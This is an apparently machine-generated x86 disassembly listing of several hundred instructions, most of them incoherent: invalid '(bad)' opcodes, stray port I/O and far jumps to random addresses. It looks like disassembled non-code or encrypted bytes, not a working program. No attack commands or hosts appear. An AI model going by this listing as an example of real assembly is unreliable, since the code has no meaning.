  44627d:	or     cl,BYTE PTR [ebp+0x7c58f7e]
  446283:	and    DWORD PTR [esi+0x60],esi
  446286:	clc    
  446287:	in     eax,0x7d
  446289:	lock outs dx,BYTE PTR fs:[esi]
  44628c:	mov    edi,0x44cbee4c
  446291:	loopne 0x446221
  446293:	das    
  446294:	repz mov cr5,eax
  446298:	call   ecx
  44629a:	pop    es
  44629b:	adc    esi,esi
  44629d:	and    BYTE PTR [esi-0x4a],al
  4462a0:	stos   BYTE PTR es:[edi],al
  4462a1:	xchg   esp,eax
  4462a2:	out    dx,eax
  4462a3:	imul   ebp,DWORD PTR ds:0x7441dcd4,0x9a4ced4b
  4462ad:	cmp    BYTE PTR [edx-0x5f],dh
  4462b0:	lahf   
  4462b1:	into   
  4462b2:	add    DWORD PTR [esi+0xd],0x5b
  4462b6:	dec    ebx
  4462b7:	adc    BYTE PTR [esi-0x5a],bl
  4462ba:	and    DWORD PTR [ebp+0x1e],edi
  4462bd:	dec    DWORD PTR [edx]
  4462bf:	mov    dl,0xe7
  4462c1:	inc    edx
  4462c2:	inc    esp
  4462c3:	out    0x91,eax
  4462c5:	sbb    eax,0xcdf329a
  4462ca:	pop    esi
  4462cb:	lock dec esi
  4462cd:	mov    esi,0xef3d8bee
  4462d2:	mov    ah,0xa2
  4462d4:	cmp    DWORD PTR ds:0xcc8fa41d,esi
  4462da:	dec    edx
  4462db:	cwde   
  4462dc:	lods   al,BYTE PTR ds:[esi]
  4462dd:	xor    edi,DWORD PTR [esi]
  4462df:	shr    DWORD PTR [ebx+edx*2],cl
  4462e2:	out    dx,al
  4462e3:	lods   eax,DWORD PTR ds:[esi]
  4462e4:	ret    
  4462e5:	xchg   ebx,eax
  4462e6:	neg    ah
  4462e8:	(bad)  
  4462e9:	jecxz  0x4462b5
  4462eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4462ec:	inc    esi
  4462ed:	stos   DWORD PTR es:[edi],eax
  4462ee:	add    eax,0xf0279454
  4462f3:	adc    al,0x1e
  4462f5:	jecxz  0x44627c
  4462f7:	nop
  4462f8:	jp     0x446324
  4462fa:	jmp    0x4462c1
  4462fc:	jae    0x44633b
  4462fe:	and    ebp,DWORD PTR [eax]
  446300:	bound  edx,QWORD PTR [ebx-0x38]
  446303:	xlat   BYTE PTR ds:[ebx]
  446304:	xchg   edi,eax
  446305:	das    
  446306:	mov    ds,WORD PTR [esi-0x45e926c2]
  44630c:	repnz sbb ebp,esi
  44630f:	push   0xed9dbee9
  446314:	scas   al,BYTE PTR es:[edi]
  446315:	popf   
  446316:	xor    BYTE PTR [ecx-0x35379fa8],ah
  44631c:	pop    ss
  44631d:	xor    DWORD PTR [ebp+0x4ef75d76],esi
  446323:	mov    fs,WORD PTR [ebx-0x33]
  446326:	(bad)  
  446327:	push   esp
  446328:	jbe    0x4462cc
  44632a:	xor    al,0xa1
  44632c:	icebp  
  44632d:	(bad)  
  44632e:	mov    edx,0x9fb64eae
  446333:	ret    
  446334:	pop    esi
  446335:	mov    esi,edx
  446337:	xchg   ebx,eax
  446338:	lods   al,BYTE PTR ds:[esi]
  446339:	ins    DWORD PTR es:[edi],dx
  44633a:	dec    esp
  44633b:	and    al,0xb0
  44633d:	pusha  
  44633e:	jnp    0x446305
  446340:	or     eax,DWORD PTR [edx-0x3a]
  446343:	mov    eax,0xdeee8ef3
  446348:	icebp  
  446349:	add    BYTE PTR [edi-0x46e59180],0xa0
  446350:	push   0x85a3e8cd
  446355:	repz in eax,dx
  446357:	sbb    BYTE PTR [esi+0x38],bl
  44635a:	not    BYTE PTR [edx]
  44635c:	push   edx
  44635d:	xlat   BYTE PTR ds:[ebx]
  44635e:	fist   DWORD PTR [ebx+0x6d]
  446361:	pusha  
  446362:	add    al,0xa8
  446364:	aaa    
  446365:	in     al,dx
  446366:	shr    DWORD PTR ss:[ebp+eiz*1-0x7300d20b],0xb1
  44636f:	mov    al,ds:0x1670202d
  446374:	pop    edi
  446375:	popa   
  446376:	jno    0x446368
  446378:	add    BYTE PTR [ebx+0x7fab5be8],dh
  44637e:	out    dx,al
  44637f:	adc    BYTE PTR [ebx+0x2fc2cb0e],0x3d
  446386:	ret    0x5c28
  446389:	popa   
  44638a:	pusha  
  44638b:	neg    al
  44638d:	bound  ebx,QWORD PTR [eax]
  44638f:	leave  
  446390:	faddp  st(1),st
  446392:	out    dx,al
  446393:	js     0x4463c3
  446395:	les    esi,FWORD PTR [esi-0x3b]
  446398:	pop    ebp
  446399:	lahf   
  44639a:	js     0x446344
  44639c:	in     eax,dx
  44639d:	mov    al,0x61
  44639f:	sti    
  4463a0:	leave  
  4463a1:	nop
  4463a2:	call   esp
  4463a4:	dec    ebx
  4463a5:	jl     0x446394
  4463a7:	lea    esi,[ecx]
  4463a9:	and    BYTE PTR [ebx],bl
  4463ab:	popa   
  4463ac:	ss mov ah,0xde
  4463af:	sub    al,0x2e
  4463b1:	icebp  
  4463b2:	mov    esi,0xbe3d14a8
  4463b7:	adc    DWORD PTR [ecx+0x2943c356],esi
  4463bd:	out    0x5f,al
  4463bf:	(bad)  
  4463c0:	in     al,dx
  4463c1:	in     eax,dx
  4463c2:	out    dx,al
  4463c3:	pop    ebp
  4463c4:	(bad)  
  4463c5:	mov    WORD PTR ds:0x8d612d0a,gs
  4463cb:	sub    eax,0x357a30be
  4463d0:	inc    edi
  4463d1:	inc    ebp
  4463d2:	out    dx,al
  4463d3:	push   0x55
  4463d5:	sub    al,0x4a
  4463d7:	sbb    ch,BYTE PTR [esi]
  4463d9:	xchg   edx,eax
  4463da:	xor    esp,DWORD PTR [ecx+0x5a8c8696]
  4463e0:	dec    ebx
  4463e1:	test   DWORD PTR [ebx],edi
  4463e3:	popf   
  4463e4:	push   esp
  4463e5:	jne    0x446454
  4463e7:	mov    esi,0xad70f15e
  4463ec:	and    ah,BYTE PTR [esi+edx*1]
  4463ef:	mov    ds:0x27b57199,eax
  4463f4:	mov    eax,0x8c08ae4d
  4463f9:	pop    ebx
  4463fa:	and    ebx,ebx
  4463fc:	inc    edx
  4463fd:	pop    edx
  4463fe:	lds    edx,FWORD PTR [esi+0x1d9e313c]
  446404:	dec    ebp
  446405:	xlat   BYTE PTR ds:[ebx]
  446406:	out    dx,eax
  446407:	int3   
  446408:	push   edx
  446409:	(bad)  
  44640a:	out    dx,al
  44640b:	inc    esp
  44640c:	imul   DWORD PTR [esi]
  44640e:	adc    cl,ah
  446410:	pusha  
  446411:	add    bh,ch
  446413:	push   eax
  446414:	test   DWORD PTR [eax+0x46744ac1],ebx
  44641a:	inc    edi
  44641b:	mov    ds:0x3aea0d97,al
  446420:	(bad)  
  446421:	aad    0x19
  446423:	loope  0x4463bb
  446425:	fsub   DWORD PTR [esi]
  446427:	js     0x446487
  446429:	jmp    0x2b98a917
  44642e:	and    ebx,DWORD PTR [edi+0x47]
  446431:	popa   
  446432:	popa   
  446433:	pop    edx
  446434:	or     esp,DWORD PTR ds:0x1ef1f77
  44643a:	out    dx,al
  44643b:	mov    ebp,0xf215d87b
  446440:	pop    ss
  446441:	adc    ch,BYTE PTR [edx+0xa936ea0]
  446447:	les    ebp,FWORD PTR ds:0x5eb771cb
  44644d:	shl    DWORD PTR [eax-0x52],1
  446450:	push   0x9dd369a5
  446455:	pusha  
  446456:	mov    bl,0x21
  446458:	xor    cl,al
  44645a:	mov    DWORD PTR [edx],ebp
  44645c:	mov    eax,ds:0x2a8ceeac
  446461:	or     DWORD PTR [edx+0x16],ecx
  446464:	mov    ds:0xf8a0682d,eax
  446469:	xchg   edx,eax
  44646a:	hlt    
  44646b:	icebp  
  44646c:	pop    esi
  44646d:	xlat   BYTE PTR ds:[ebx]
  44646e:	fbld   TBYTE PTR [edi]
  446470:	daa    
  446471:	push   0xffffffe7
  446473:	cmp    DWORD PTR [esi-0x1e],esp
  446476:	punpckhbw mm3,QWORD PTR [esi+0x3ade4d17]
  44647d:	popa   
  44647e:	or     DWORD PTR [esi],0xffffffab
  446481:	cmc    
  446482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446483:	or     eax,DWORD PTR [edi*8+0x483263e1]
  44648a:	or     BYTE PTR [ecx-0x2ec26589],ah
  446490:	and    DWORD PTR [eax+esi*8-0x56c0fa5f],esi
  446497:	test   eax,0x81121ed8
  44649c:	xchg   edi,eax
  44649d:	pop    esp
  44649e:	out    dx,al
  44649f:	shl    ch,0x15
  4464a2:	xor    DWORD PTR [ebx+ecx*1-0x78],ebx
  4464a6:	lods   eax,DWORD PTR ds:[esi]
  4464a7:	(bad)  
  4464a8:	cs mov ebp,0x7e4920b8
  4464ae:	loope  0x4464ea
  4464b0:	and    DWORD PTR [ebx],esi
  4464b2:	out    dx,al
  4464b3:	pop    edi
  4464b4:	jge    0x44649d
  4464b6:	ja     0x4464c2
  4464b8:	std    
  4464b9:	outs   dx,DWORD PTR ds:[esi]
  4464ba:	mov    edi,0xdf3120a0
  4464bf:	mov    esp,0xc6294730
  4464c4:	pop    esi
  4464c5:	adc    dl,BYTE PTR [eax-0x56]
  4464c8:	iret   
  4464c9:	(bad)  
  4464ca:	call   0x18a3c258
  4464cf:	or     ch,al
  4464d1:	loope  0x446530
  4464d3:	int    0xff
  4464d5:	push   esp
  4464d6:	outs   dx,BYTE PTR ds:[esi]
  4464d7:	mov    al,0xc1
  4464d9:	dec    eax
  4464da:	out    dx,al
  4464db:	cld    
  4464dc:	ret    
  4464dd:	mov    esp,0x4f7d99cc
  4464e2:	scas   eax,DWORD PTR es:[edi]
  4464e3:	cdq    
  4464e4:	xor    dh,BYTE PTR [ecx+edx*1]
  4464e7:	fs repz pusha 
  4464ea:	imul   ebx,DWORD PTR [ebp-0x5b2b0c27],0x1f
  4464f1:	sbb    BYTE PTR [edi-0x74],dl
  4464f4:	inc    edx
  4464f5:	loope  0x44653e
  4464f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4464f8:	jmp    0x5055:0xd73eee58
  4464ff:	mov    DWORD PTR [eax+0x5a9c13af],ecx
  446505:	cmp    DWORD PTR ss:[ebp+0x1458265e],edx
  44650c:	xchg   ecx,eax
  44650d:	push   ebx
  44650e:	add    BYTE PTR [edi-0x55d15921],ch
  446514:	sbb    al,0x18
  446516:	fild   QWORD PTR ds:0xd66c6097
  44651c:	mov    al,0xe1
  44651e:	adc    bh,BYTE PTR [ebp+0x1]
  446521:	jl     0x446511
  446523:	jmp    0x44652a
  446525:	das    
  446526:	and    DWORD PTR [ecx],esi
  446528:	lds    ebx,FWORD PTR [eax+edi*2]
  44652b:	div    DWORD PTR [ecx+edx*8]
  44652e:	mov    dh,0xa0
  446530:	add    esi,DWORD PTR [esi+ecx*2-0x63]
  446534:	mov    ebx,0x5d548b0b
  446539:	xchg   esi,eax
  44653a:	lds    eax,FWORD PTR [esp]
  44653d:	inc    ebp
  44653e:	xchg   esi,eax
  44653f:	ins    BYTE PTR es:[edi],dx
  446540:	fild   QWORD PTR ds:[ecx]
  446543:	hlt    
  446544:	lds    ebp,FWORD PTR [eax-0x7d9359a7]
  44654a:	out    dx,eax
  44654b:	lods   al,BYTE PTR ds:[esi]
  44654c:	loopne 0x4464ee
  44654e:	jbe    0x4465c1
  446550:	into   
  446551:	pop    edx
  446552:	out    dx,al
  446553:	cmp    al,0x93
  446555:	mov    esp,0x8f7fce2c
  44655a:	neg    DWORD PTR [ebx-0x54c6b3f5]
  446560:	pop    esi
  446561:	inc    eax
  446562:	add    bl,BYTE PTR [ecx]
  446564:	jmp    0x1649:0x10aceee3
  44656b:	std    
  44656c:	shr    DWORD PTR [edx-0x32e05f01],0x86
  446573:	in     al,dx
  446574:	dec    ecx
  446575:	retf   0x3c96
  446578:	cmc    
  446579:	and    esi,eax
  44657b:	jns    0x44650d
  44657d:	mov    WORD PTR [ecx+eax*4+0x69],ds
  446581:	and    al,0xbb
  446583:	sub    BYTE PTR [ebx+0x3df0f160],bh
  446589:	jb     0x44652e
  44658b:	jmp    0x80da:0x96f39b6a
  446592:	nop
  446593:	sub    BYTE PTR [esi+edx*2-0x55b116d2],ah
  44659a:	sbb    ah,BYTE PTR [edx+0x4e613c05]
  4465a0:	pop    edx
  4465a1:	jo     0x446545
  4465a3:	pusha  
  4465a4:	fidivr WORD PTR [ebx+0x18]
  4465a7:	ret    0x215e
  4465aa:	pop    edx
  4465ab:	lods   al,BYTE PTR ds:[esi]
  4465ac:	or     ch,bh
  4465ae:	aam    0x76
  4465b0:	jecxz  0x446604
  4465b2:	xchg   ebx,eax
  4465b3:	add    dh,bl
  4465b5:	icebp  
  4465b6:	outs   dx,BYTE PTR ds:[esi]
  4465b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4465b8:	rcr    cl,1
  4465ba:	loop   0x446559
  4465bc:	pop    esi
  4465bd:	push   ecx
  4465be:	jnp    0x4465dc
  4465c0:	aad    0x57
  4465c2:	repnz push eax
  4465c4:	add    DWORD PTR [ecx-0x30],esp
  4465c7:	jbe    0x4465bd
  4465c9:	add    esi,DWORD PTR [edx+0x606b5fd4]
  4465cf:	pusha  
  4465d0:	fs div cl
  4465d3:	jne    0x446566
  4465d5:	rol    BYTE PTR [esi],0x79
  4465d8:	(bad)  
  4465d9:	jmp    0x4465eb
  4465db:	mov    eax,ds:0x3ba4d33
  4465e0:	pop    edi
  4465e1:	rol    bl,1
  4465e3:	dec    esp
  4465e4:	mov    esi,0x7c0ea2c2
  4465e9:	mov    esp,0x2c5e0656
  4465ee:	repnz xchg esp,eax
  4465f0:	into   
  4465f1:	pushf  
  4465f2:	inc    edi
  4465f3:	aas    
  4465f4:	cld    
  4465f5:	pusha  
  4465f6:	cwde   
  4465f7:	or     cl,cl
  4465f9:	jne    0x446622
  4465fb:	xor    al,0xd3
  4465fd:	fsub   st(6),st
  4465ff:	adc    ah,BYTE PTR [ebx+0xd]
  446602:	inc    esi
  446603:	mov    fs,ebx
  446605:	xchg   ecx,eax
  446606:	jge    0x4465c7
  446608:	pop    esp
  446609:	ins    BYTE PTR es:[edi],dx
  44660a:	shl    BYTE PTR [ebx-0x5a2b393d],0xd6
  446611:	repnz int 0xe8
  446614:	dec    ebx
  446615:	in     al,0x65
  446617:	dec    esp
  446618:	pop    esi
  446619:	jbe    0x4465b1
  44661b:	cwde   
  44661c:	je     0x446626
  44661e:	pop    es
  44661f:	mov    eax,ds:0x451a5679
  446624:	out    dx,eax
  446625:	sbb    eax,0x835d37f0
  44662a:	cmp    eax,0xb4ac54b0
  44662f:	lahf   
  446630:	adc    BYTE PTR [ebx],0xfa
  446633:	jmp    0x3e59c6e1
  446638:	test   BYTE PTR [esi+eiz*1-0x114c9441],ah
  44663f:	push   esi
  446640:	das    
  446641:	mov    ds:0x6a23d46d,eax
  446646:	add    eax,0x22f29ba0
  44664b:	xchg   ecx,eax
  44664c:	mov    esi,0x44ea2e6
  446651:	mov    dl,0xee
  446653:	inc    edx
  446654:	push   ss
  446655:	cmp    ch,BYTE PTR es:[edx]
  446658:	pop    es
  446659:	cmc    
  44665a:	call   0x4ca1:0x9ea27ec7
  446661:	cwde   
  446662:	(bad)  
  446663:	xlat   BYTE PTR ds:[ebx]
  446664:	sbb    eax,0x9393ee9a
  446669:	loopne 0x4466c5
  44666b:	icebp  
  44666c:	add    eax,0x11a0db8c
  446671:	xchg   esi,eax
  446672:	mov    fs,ebp
  446674:	jmp    0x4614:0x5e1e8c38
  44667b:	mul    DWORD PTR [edx+eiz*1+0x17]
  44667f:	xor    al,0xb6
  446681:	pusha  
  446682:	inc    BYTE PTR [edi-0x4b]
  446685:	scas   eax,DWORD PTR es:[edi]
  446686:	cmp    BYTE PTR [ecx],bh
  446688:	mov    ds:0x49698e19,eax
  44668d:	jmp    0x44667d
  44668f:	xor    di,WORD PTR [edi+0xe48f30d]
  446696:	push   ds
  446697:	mov    eax,ds:0x3be0551d
  44669c:	push   0xffffff8f
  44669e:	xchg   edi,eax
  44669f:	les    ebx,FWORD PTR [esi-0x2b]
  4466a2:	enter  0x905c,0x85
  4466a6:	pop    ds
  4466a7:	fwait
  4466a8:	lods   al,BYTE PTR ds:[esi]
  4466a9:	sub    al,0x83
  4466ab:	mov    eax,ds:0x876aae10
  4466b0:	scas   al,BYTE PTR es:[edi]
  4466b1:	repz jge 0x446683
  4466b4:	mov    esi,0x5e6e68ef
  4466b9:	add    DWORD PTR [edx],eax
  4466bb:	fmulp  st(1),st
  4466bd:	or     bl,BYTE PTR [eax]
  4466bf:	das    
  4466c0:	mov    bh,0x60
  4466c2:	into   
  4466c3:	pop    esp
  4466c4:	or     eax,DWORD PTR [ebp-0x74261726]
  4466ca:	jmp    0x4466ac
  4466cc:	test   al,0xf
  4466ce:	jnp    0x4466aa
  4466d0:	or     BYTE PTR [edx-0x5be105b9],dh
  4466d6:	cwde   
  4466d7:	test   eax,0x2b7e4260
  4466dc:	adc    ah,cl
  4466de:	or     eax,0xe6c01a6c
  4466e3:	xchg   ebp,eax
  4466e4:	and    ch,BYTE PTR [eax]
  4466e6:	arpl   WORD PTR [eax-0x20b402b2],bp
  4466ec:	push   ds
  4466ed:	jae    0x4466e5
  4466ef:	inc    edi
  4466f0:	enter  0xc7a2,0x9e
  4466f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4466f5:	and    BYTE PTR [eax-0x4e996388],ch
  4466fb:	pop    si
  4466fd:	xlat   BYTE PTR ds:[ebx]
  4466fe:	cmc    
  4466ff:	clc    
  446700:	sub    eax,DWORD PTR [ebp+0x2cb610a1]
  446706:	fsub   QWORD PTR [ebx+0x5886acd8]
  44670c:	inc    eax
  44670d:	cmp    al,0xee
  44670f:	cli    
  446710:	fisub  DWORD PTR [ecx+0x4d0096b3]
  446716:	lea    ecx,[ecx]
  446718:	mov    WORD PTR [eax-0x69],fs
  44671b:	or     al,0x24
  44671d:	fcomp  QWORD PTR [esi-0x125f9d46]
  446723:	in     eax,dx
  446724:	popa   
  446725:	aad    0xd
  446727:	data16 ins BYTE PTR es:[edi],dx
  446729:	jmp    0x446771
  44672b:	cmp    ah,BYTE PTR [eax+eiz*2-0x6149b232]
  446732:	out    0x67,al
  446734:	push   edi
  446735:	data16 jmp 0x4466f5
  446738:	jg     0x44670c
  44673a:	mov    cl,BYTE PTR [ebx+0x4945cda8]
  446740:	clc    
  446741:	jmp    0xb24a:0xaa86a1fa
  446748:	adc    DWORD PTR [esi-0x6ed885d3],eax
  44674e:	cmp    bh,BYTE PTR [ecx]
  446750:	xor    DWORD PTR [eax-0x21bf5d8c],esi
  446756:	jmp    0xced507ec
  44675b:	xchg   DWORD PTR [ecx+0x45d69274],ebx
  446761:	pop    edx
  446762:	ror    BYTE PTR [ebp+0x47],0x91
  446766:	mov    ds:0xedc7ed91,al
  44676b:	add    edi,DWORD PTR [eax-0x9]
  44676e:	sbb    BYTE PTR [ebx],ah
  446770:	rcl    al,1
  446772:	adc    ax,0x6138
  446776:	xchg   ebx,eax
  446777:	sbb    eax,DWORD PTR [ecx]
  446779:	jb     0x446742
  44677b:	pusha  
  44677c:	icebp  
  44677d:	imul   esp,edi,0x9e8a6304
  446783:	mov    bl,0xc5
  446785:	pusha  
  446786:	mov    ?,WORD PTR [edi-0x24]
  446789:	and    al,0x9
  44678b:	test   eax,0xc56e9abe
  446790:	push   ebx
  446791:	xchg   ecx,eax
  446792:	dec    edx
  446793:	xchg   edi,eax
  446794:	rol    bh,1
  446796:	mov    dh,0x70
  446798:	mov    DWORD PTR [eax+0x7a],esp
  44679b:	imul   eax,DWORD PTR [esi-0x18],0x60eb4cbb
  4467a2:	mov    WORD PTR [eax-0x39ebf142],ds
  4467a8:	stc    
  4467a9:	mov    esi,0x569d27ee
  4467ae:	xchg   esp,eax
  4467af:	mov    ch,BYTE PTR [esi]
  4467b1:	(bad)  
  4467b2:	(bad)  
  4467b3:	mov    eax,ds:0xcf84b41e
  4467b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4467b9:	hlt    
  4467ba:	inc    eax
  4467bb:	aad    0x5e
  4467bd:	fistp  QWORD PTR [esi-0x66]
  4467c0:	jno    0x44675a
  4467c2:	pop    esp
  4467c3:	pop    esi
  4467c4:	test   BYTE PTR [esi+0x69],dl
  4467c7:	lock test DWORD PTR [edx-0x6a],0x3eb0f6a1
  4467cf:	mov    dh,0x26
  4467d1:	add    ch,dh
  4467d3:	ss pop ss
  4467d5:	stos   BYTE PTR es:[edi],al
  4467d6:	arpl   WORD PTR [ebx],si
  4467d8:	and    DWORD PTR [esi-0x7a95cca],ebp
  4467de:	or     eax,0x6e3d1153
  4467e3:	xor    BYTE PTR [eax-0x1b],dl
  4467e6:	or     dl,BYTE PTR [ebx+eiz*2-0x3c3cd75b]
  4467ed:	fld    QWORD PTR [edx+0x71d95d27]
  4467f3:	bnd jbe 0x4467de
  4467f6:	jb     0x4467a1
  4467f8:	xchg   esp,eax
  4467f9:	sub    dh,ch
  4467fb:	xchg   DWORD PTR [eax+eax*4-0x34],ebx
  4467ff:	aam    0xa5
  446801:	mov    dl,0xee
  446803:	js     0x44679b
  446805:	or     bl,BYTE PTR [esi-0x6a]
  446808:	inc    edi
  446809:	ret    0xa187
  44680c:	into   
  44680d:	mov    esp,DWORD PTR [ebx]
  44680f:	(bad)  
  446810:	push   0xffffffe0
  446812:	mov    esi,0x43b45f08
  446817:	pop    es
  446818:	and    al,0x55
  44681a:	sbb    edi,DWORD PTR [edx]
  44681c:	stos   DWORD PTR es:[edi],eax
  44681d:	mov    BYTE PTR [esi+0x48],ah
  446820:	or     al,0x61
  446822:	stos   BYTE PTR es:[edi],al
  446823:	mov    bh,0x25
  446825:	sub    DWORD PTR [eax+0x127302b5],ebp
  44682b:	mov    BYTE PTR [edi],dl
  44682d:	mov    al,0xee
  44682f:	popa   
  446830:	and    BYTE PTR [ebp+ecx*2-0x4c],ah
  446834:	std    
  446835:	pusha  
  446836:	jl     0x4467f4
  446838:	clc    
  446839:	data16 (bad) 
  44683b:	cld    
  44683c:	xchg   edi,eax
  44683d:	mov    eax,ds:0xdfd73e24
  446842:	jg     0x4467d6
  446844:	add    edx,DWORD PTR [edx]
  446846:	mov    ebx,0x37de76bd
  44684b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44684c:	test   esp,0xe089780a
  446852:	cwde   
  446853:	(bad)  
  446854:	lahf   
  446855:	jno    0x446845
  446857:	push   0xffffffdb
  446859:	cdq    
  44685a:	push   0x39
  44685c:	sbb    ch,BYTE PTR [eax+0x488bd971]
  446862:	out    0x2d,eax
  446864:	jmp    0x9e95ed47
  446869:	xor    esp,DWORD PTR gs:[edi]
  44686c:	pop    ebp
  44686d:	jns    0x44680b
  44686f:	xchg   bh,dl
  446871:	mov    ah,0x81
  446873:	jmp    0xa1b9abf6
  446878:	in     al,0x1a
  44687a:	jecxz  0x446891
  44687c:	jae    0x446846
  44687e:	nop
  44687f:	call   0x56499ae2
  446884:	xor    al,0x21
  446886:	(bad)
  446889:	pusha  
  44688a:	cmp    eax,0xcd4b9661
  44688f:	add    ah,BYTE PTR [ecx+0x7c14eeb5]
  446895:	rol    bl,cl
  446897:	push   esp
  446898:	jle    0x446912
  44689a:	(bad)  
  44689b:	imul   esi
  44689d:	inc    ecx
  44689e:	or     al,0x8
  4468a0:	xor    ecx,esp
  4468a2:	xor    al,0x2d
  4468a4:	arpl   si,bx
  4468a6:	xchg   BYTE PTR ds:0xdfc8f95e,bh
  4468ac:	ret    
  4468ad:	or     ch,bl
  4468af:	xor    DWORD PTR [edi-0x70b12aa0],0x34
  4468b6:	dec    esp
  4468b7:	jb     0x446923
  4468b9:	imul   ebp,esi,0x2
  4468bc:	jmp    0x430c:0x559e3932
  4468c3:	mov    eax,ds:0x230b4687
  4468c8:	popf   
  4468c9:	(bad)  
  4468ca:	out    dx,eax
  4468cb:	add    BYTE PTR [esi-0x75],bl
  4468ce:	loop   0x44691f
  4468d0:	mov    ds:0x614cafe2,eax
  4468d5:	popa   
  4468d6:	cld    
  4468d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4468d8:	cli    
  4468d9:	pop    esp
  4468da:	retf   
  4468db:	outs   dx,BYTE PTR ds:[esi]
  4468dc:	ja     0x4468ec
  4468de:	jmp    0x4468e8
  4468e0:	xchg   ecx,eax
  4468e1:	js     0x4468e3
  4468e3:	push   edx
  4468e4:	lahf   
  4468e5:	test   al,0x9b
  4468e7:	pop    eax
  4468e8:	out    dx,eax
  4468e9:	push   edx
  4468ea:	in     al,0xc9
  4468ec:	push   edx
  4468ed:	fs out dx,al
  4468ef:	mov    bl,BYTE PTR [ecx+eiz*4+0x41]
  4468f3:	imul   ebx,DWORD PTR [esi-0x1],0xa6a30288
  4468fa:	call   0xb558:0x895e67ee
  446901:	push   es
  446902:	imul   ebx,edi
  446905:	xor    ecx,DWORD PTR [esi-0x7b]
  446908:	call   0xde2a:0x9805ed14
  44690f:	inc    ebp
  446910:	and    edx,DWORD PTR [edi]
  446912:	pop    esi
  446913:	loope  0x446940
  446915:	popa   
  446916:	(bad)  
  446917:	dec    ebx
  446918:	cmp    eax,0x25995a83
  44691d:	mov    ch,0xc6
  44691f:	push   cs
  446920:	inc    DWORD PTR [ecx+esi*1-0x13]
  446924:	pop    esi
  446925:	fld    DWORD PTR [ebx+esi*4-0x5f547242]
  44692c:	inc    ecx
  44692d:	add    ecx,DWORD PTR [esi]
  44692f:	gs pusha 
  446931:	rcr    BYTE PTR [edi],cl
  446933:	jmp    0x1f8d5970
  446938:	or     ah,0x82
  44693b:	mov    eax,ds:0x2488f70f
  446940:	inc    esp
  446941:	daa    
  446942:	jmp    DWORD PTR [ecx-0x51b9fd49]
  446948:	jo     0x4468f5
  44694a:	scas   al,BYTE PTR es:[edi]
  44694b:	(bad)  
  44694c:	scas   al,BYTE PTR es:[edi]
  44694d:	mov    esi,0x8bda156
  446952:	jmp    0x5162:0x51c3e54d
  446959:	call   0xc9c7:0xd31b1ae5
  446960:	outs   dx,BYTE PTR ds:[esi]
  446961:	mov    BYTE PTR [esi-0x4a],ah
  446964:	scas   eax,DWORD PTR es:[edi]
  446965:	pusha  
  446966:	mov    edi,0xcbdcc40c
  44696b:	sub    eax,0x80ee4887
  446970:	mov    bh,0xa9
  446972:	cs mov ecx,ebp
  446975:	and    DWORD PTR [edi-0x5f],esi
  446978:	sub    esi,DWORD PTR [ecx-0x3ac2efc8]
  44697e:	ror    DWORD PTR [ebp+0x36],0xa2
  446982:	mov    eax,ds:0x1a3f0f21
  446987:	push   esp
  446988:	jmp    0x446934
  44698a:	jp     0x446926
  44698c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44698d:	pop    eax
  44698e:	aas    
  44698f:	loopne 0x4469ef
  446991:	sub    cl,BYTE PTR [edi+esi*1]
  446994:	ret    0x22d7
  446997:	and    BYTE PTR [ecx+0x61],0x73
  44699b:	xor    BYTE PTR [eax],ah
  44699d:	inc    esp
  44699e:	fldcw  WORD PTR [edx]
  4469a0:	pop    ecx
  4469a1:	inc    ebp
  4469a2:	imul   eax,edx,0x3522a13b
  4469a8:	mov    ebx,0x5e855f7e
  4469ad:	sbb    eax,0x7c87df62
  4469b2:	xchg   esi,eax
  4469b3:	popf   
  4469b4:	add    al,0x42
  4469b6:	cmc    
  4469b7:	shr    BYTE PTR [ebx],cl
  4469b9:	mov    eax,ds:0x51493272
  4469be:	mov    dl,0x4f
  4469c0:	pop    esi
  4469c1:	mov    al,BYTE PTR [ecx]
  4469c3:	xor    BYTE PTR [ecx+eax*2+0x6],0xe1
  4469c8:	popf   
  4469c9:	add    al,0xf1
  4469cb:	loop   0x4469fe
  4469cd:	in     al,dx
  4469ce:	in     al,dx
  4469cf:	std    
  4469d0:	aas    
  4469d1:	xchg   esp,eax
  4469d2:	or     ch,cl
  4469d4:	push   ds
  4469d5:	pushf  
  4469d6:	das    
  4469d7:	jb     0x446a37
  4469d9:	leave  
  4469da:	dec    ebp
  4469db:	add    DWORD PTR [eax-0x1f27d25c],esp
  4469e1:	inc    ecx
  4469e2:	mov    ebx,0x45204f13
  4469e7:	cmp    eax,DWORD PTR [eax-0x3]
  4469ea:	scas   al,BYTE PTR es:[edi]
  4469eb:	push   esp
  4469ec:	cmp    eax,0xfc0eee32
  4469f1:	push   0x22
  4469f3:	adc    eax,eax
  4469f5:	mov    eax,ds:0xd992a57f
  4469fa:	call   0x48e563de
  4469ff:	cmp    DWORD PTR gs:[ebx-0x12],edi
  446a03:	es mov ch,0xc2
  446a06:	ins    BYTE PTR es:[edi],dx
  446a07:	add    BYTE PTR [ebx+0x7fa13e63],dh
  446a0d:	ss hlt 
  446a0f:	mov    bl,0x14
  446a11:	leave  
  446a12:	fs add eax,0x74888d5d
  446a18:	xor    eax,0xeecdf730
  446a1d:	(bad)  
  446a1e:	arpl   WORD PTR [ecx-0x39762ec8],sp
  446a24:	or     edx,DWORD PTR [ebx-0x8]
  446a27:	out    0x5e,eax
  446a29:	test   al,0x91
  446a2b:	add    BYTE PTR [ebx+0x74],dl
  446a2e:	mov    al,0x50
  446a30:	sahf   
  446a31:	pop    ecx
  446a32:	push   edx
  446a33:	sbb    eax,0xe0e47a7f
  446a38:	push   eax
  446a39:	mov    BYTE PTR [ebp+edi*8+0x46fa3652],ah
  446a40:	sahf   
  446a41:	sbb    DWORD PTR [ebx],esi
  446a43:	out    dx,al
  446a44:	pop    ss
  446a45:	cmp    BYTE PTR [eax+esi*4+0x73],cl
  446a49:	mov    ch,0x6e
  446a4b:	push   esp
  446a4c:	sbb    BYTE PTR ss:[eax],0xd8
  446a50:	adc    esi,eax
  446a52:	hlt    
  446a53:	test   DWORD PTR [edi-0x5e],edi
  446a56:	pop    edx
